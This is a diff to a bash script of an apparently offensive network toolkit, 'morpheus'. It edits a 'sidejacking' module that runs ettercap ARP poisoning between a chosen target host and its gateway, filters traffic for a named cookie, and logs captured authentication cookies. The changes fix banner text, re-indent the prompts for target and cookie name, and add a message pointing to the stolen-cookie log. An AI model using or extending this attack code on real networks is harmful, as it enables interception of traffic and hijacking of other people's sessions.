@@ -316,7 +316,7 @@ fi
 sh_stage2 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}    This module will display port 80(tcp) and port 443(https)     ${BlueF}|"
+echo "${BlueF}    | ${YellowF}    This module will display port 80(http) and port 443(https)    ${BlueF}|"
 echo "${BlueF}    | ${YellowF}  traffic from selected target host, And it will warn attacker    ${BlueF}|"
 echo "${BlueF}    | ${YellowF} If any auth cookie its captured And stored in 'sidejacking.log'  ${BlueF}|"
 echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
@@ -340,8 +340,8 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
 
   echo ${BlueF}[☠]${white} Edit sidejacking.eft${RedF}!${Reset};
   sleep 1
- fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nChose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
-FiLteR=$(zenity --title="☠ Enter COOKIE NAME ☠" --text "example:userid\nInput a cookie name to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+  fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nChose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+  FiLteR=$(zenity --title="☠ Enter COOKIE NAME ☠" --text "example:userid\nInput a cookie name to filter through morpheus." --entry --width 270) > /dev/null 2>&1
   # replace values in template.filter with sed bash command
   cd $IPATH/filters
   sed -i "s|TaRgEt|$fil_one|g" sidejacking.eft # NO dev/null to report file not existence :D
@@ -382,6 +382,13 @@ FiLteR=$(zenity --title="☠ Enter COOKIE NAME ☠" --text "example:userid\nInpu
         ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -L $IPATH/logs/sidejacking -M ARP /$rhost/ /$gateway/
         fi
       fi
+
+  # display captured cookies to user
+  echo ""
+  echo "${BlueF}[☠]${white} filter:${YellowF}$FiLteR ${white}cookies report${RedF}!"
+  echo "${BlueF}[☠]${white} Please check: morpheus/logs/sidejacking.log${RedF}!"
+  echo ""
+  sleep 3
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
